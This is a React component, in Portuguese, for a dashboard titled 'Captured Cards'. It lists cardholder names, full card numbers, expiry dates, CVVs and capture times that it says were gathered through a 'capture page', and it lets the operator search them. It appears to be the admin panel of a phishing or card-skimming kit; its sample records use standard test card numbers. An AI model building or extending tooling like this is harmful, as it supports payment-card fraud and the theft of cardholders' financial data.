
import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";

// Mock data
const mockCapturedCards = [
  { 
    id: 1, 
    nome_cliente: "João Silva", 
    numero_cartao: "4111 1111 1111 1111", 
    validade: "12/25", 
    cvv: "123", 
    criado_em: "2023-05-10T14:32:00Z",
    bandeira: "visa"
  },
  { 
    id: 2, 
    nome_cliente: "Maria Oliveira", 
    numero_cartao: "5555 5555 5555 4444", 
    validade: "10/24", 
    cvv: "456", 
    criado_em: "2023-05-11T09:15:00Z",
    bandeira: "mastercard"
  },
  { 
    id: 3, 
    nome_cliente: "Carlos Santos", 
    numero_cartao: "3782 822463 10005", 
    validade: "08/26", 
    cvv: "789", 
    criado_em: "2023-05-12T16:45:00Z",
    bandeira: "amex"
  },
];

const CardCapture = () => {
  const [searchTerm, setSearchTerm] = useState("");
  const [capturedCards, setCapturedCards] = useState(mockCapturedCards);

  const filteredCards = capturedCards.filter(card => 
    card.nome_cliente.toLowerCase().includes(searchTerm.toLowerCase()) ||
    card.numero_cartao.includes(searchTerm)
  );

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return new Intl.DateTimeFormat('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }).format(date);
  };

  const getBadgeForCardBrand = (bandeira: string) => {
    switch (bandeira.toLowerCase()) {
      case 'visa':
        return <Badge className="bg-blue-600">VISA</Badge>;
      case 'mastercard':
        return <Badge className="bg-red-600">Mastercard</Badge>;
      case 'amex':
        return <Badge className="bg-green-600">Amex</Badge>;
      default:
        return <Badge>{bandeira}</Badge>;
    }
  };

  return (
    <div className="space-y-6 animate-fade-in">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold tracking-tight">Cartões Capturados</h1>
      </div>

      <div className="flex items-center gap-4 mb-6">
        <div className="relative flex-1">
          <Input
            placeholder="Buscar por nome ou número do cartão..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-10"
          />
          <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-search">
              <circle cx="11" cy="11" r="8"/>
              <path d="m21 21-4.3-4.3"/>
            </svg>
          </div>
        </div>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Cartões Capturados</CardTitle>
          <CardDescription>
            Lista de cartões capturados através da página de captura
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Nome</TableHead>
                <TableHead>Número do Cartão</TableHead>
                <TableHead>Validade</TableHead>
                <TableHead>CVV</TableHead>
                <TableHead>Bandeira</TableHead>
                <TableHead>Data de Captura</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredCards.length > 0 ? (
                filteredCards.map((card) => (
                  <TableRow key={card.id}>
                    <TableCell className="font-medium">{card.nome_cliente}</TableCell>
                    <TableCell className="font-mono">{card.numero_cartao}</TableCell>
                    <TableCell>{card.validade}</TableCell>
                    <TableCell>{card.cvv}</TableCell>
                    <TableCell>{getBadgeForCardBrand(card.bandeira)}</TableCell>
                    <TableCell>{formatDate(card.criado_em)}</TableCell>
                  </TableRow>
                ))
              ) : (
                <TableRow>
                  <TableCell colSpan={6} className="text-center py-6 text-muted-foreground">
                    Nenhum cartão encontrado.
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  );
};

export default CardCapture;
